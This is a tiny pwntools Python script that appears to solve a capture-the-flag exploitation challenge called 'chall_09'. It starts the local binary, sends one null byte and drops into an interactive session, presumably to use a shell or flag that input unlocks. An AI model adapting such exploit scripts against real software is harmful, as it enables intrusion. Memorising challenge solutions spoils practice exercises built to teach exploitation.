#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_09')

p = process(binary.path)

p.send(b'\x00')
p.interactive()
